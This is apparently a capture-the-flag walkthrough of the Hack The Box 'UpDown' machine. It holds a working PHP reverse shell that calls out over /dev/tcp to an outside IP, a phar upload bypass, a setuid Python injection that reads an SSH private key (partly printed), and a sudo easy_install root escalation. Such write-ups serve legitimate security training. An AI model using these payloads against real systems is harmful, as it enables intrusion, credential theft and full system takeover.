#### Enumeration

I quick nmap scan shows that ports `22` and `80` are open.

After navigating to the ip address, I see the domain is `siteisup.htb`, which I add to the hosts file.

```
echo "10.10.11.177 siteisup.htb" | sudo tee -a /etc/hosts
```

I do a subdomain and vhost enumeration, eventually finding a `dev.siteisup.htb` subdomain, that is forbidden.

After much enumeration with `gobuster` and `ffuf`, the successful command is the one below, it edits out files with a size of 1131, as every domain ran via brute search returned OK-200,

```
ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 1131

dev                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4221ms]
```

I add the subdomain to the host file:

```
echo "10.10.11.177 dev.siteisup.htb" | sudo tee -a /etc/hosts
```

I do a brute force on directories against `siteisup.htb` and find the `dev` directory:

```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://siteisup.htb

/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]
```

Further enumeration on the dev directory turns up a `.git` folder:

```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://siteisup.htb/dev

/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.git/HEAD            (Status: 200) [Size: 21]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 0]
```

I install `git-dumper` to grab the information on the app's web-development:

```
$ pip install git-dumper

$ git-dumper http://siteisup.htb/dev/.git dev
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.git/ [200]
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
[-] http://siteisup.htb/dev/.gitignore responded with status code 404
[-] Fetching http://siteisup.htb/dev/.git
....
```

After git dumps, I see the file `.htaccess` with the output:

```
$ cat .htaccess
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

In Burp Suite, I visit the subdomain `dev.siteisup.htb` and catch it with FoxyProxy. In BurpSuite I go to Proxy->Proxy Settings->Match and Replace Rules->Add match/replace rule, Type: Request Header, Replace: Special-Dev: only4dev

#### Foothold

When on the page `dev.issiteup.htb`, instead of a user input form for the ip address, there is a file upload form. 

I create a file `info.php` with the following information:

```
$ echo "<?php phpinfo(); ?>" > info.php
$ zip info.zip info.php
$ mv info.zip info.txt
```

I upload the `info.txt` then run the payload by running `http://dev.siteisup.htb/? page=phar://uploads/f4ffea0fb8f7269a2cca12cd1b266e58/info.txt/info` in the browser.

I then run the following program by cloning it in github: https://github.com/teambi0s/dfunc-bypasser, which loops through an array of dangerous functions that could lead to a reverse shell. 

I add the following line to line 38 of the script, to make sure the header is added:

```
phpinfo = requests.get(url, headers={"Special-dev":"only4dev"}).text
```

Then I execute the script: 
```
python dfunc-bypasser.py --url 'http://dev.siteisup.htb/? page=phar://uploads/6723be7f59bf9a81d941ecfc3c1bb717/info.txt/info'
...
proc_open
...
```
So it seems proc_open could work, as the function is not disabled by the target. 

I create a php file called `reverse1.php`

```
<?php
$descriptorspec = array(
0 => array('pipe', 'r'), // stdin
1 => array('pipe', 'w'), // stdout
2 => array('pipe', 'a') // stderr
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
?>
```

Then running the following commands:

```
$ zip reverse1.zip reverse1.php
$ mv reverse1.zip reverse1.txt
```

And run a netcat listener on my local `nc -lvnp`

I run the following in my web browser:

```
http://dev.siteisup.htb/?page=phar://uploads/5e8b610bccb0e5f6ee2171aabab33be5/reverse1.txt/reverse1
```

After executing, I get access to the shell on my netcat listener:

```
$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.207] from (UNKNOWN) [10.129.114.97] 55440
bash: cannot set terminal process group (894): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$ pwd
pwd
/var/www/dev
```

After some enumeration, in `home/developer/dev` I see two files in the `/dev` directory, `siteisup` has `setuid` permissions set and will run as the owner of the file. I run the executable and try injecting a payload.
From there I read the user's private ssh key:

```
./siteisup
__import__('os').system('/bin/bash')
id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
 cat /home/developer/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
```

I use the `ssh` key to login to developer user:

```
developer@updown:/home/developer/dev$ chmod 600 id_rsa
chmod 600 id_rsa
chmod: cannot access 'id_rsa': No such file or directory
developer@updown:/home/developer/dev$ chmod 600 /home/developer/.ssh/id_rsa
chmod 600 /home/developer/.ssh/id_rsa
developer@updown:/home/developer/dev$ ssh -i id_rsa developer@siteisup.htb
ssh -i id_rsa developer@siteisup.htb
Warning: Identity file id_rsa not accessible: No such file or directory.
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 29 02:24:56 UTC 2024
...

```

After getting access to the developer user, I run `sudo -l`, to see what I can run as root:

```
developer@updown:~$ sudo -l
sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install

```


The output above shows that the developer user may run easy_install , without a password. GTFOBins is an excellent website where we can search for Linux commands that can be misused in order to gain a shell, read/write to files, etc. Searching for easy_install shows that it can in fact be abused to spawn a shell with elevated privileges.

The PoC shown in GTFOBins is a sequence of bash commands. Firstly, a temporary directory is created, wherein a Python script that spawns a /bin/sh shell is subsequently created. Since easy_install is a (deprecated)

Python module which installs Python libraries, the final part of the PoC consists of 'installing' the script we just created (using sudo ), which will trigger the payload and spawn a shell as root .

```
$ TF=$(mktemp -d)
$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
$ sudo easy_install $TF

# id 
uid=0(root) gid=0(root) groups=0(root)
```

The flag can be found in `/root/root.txt`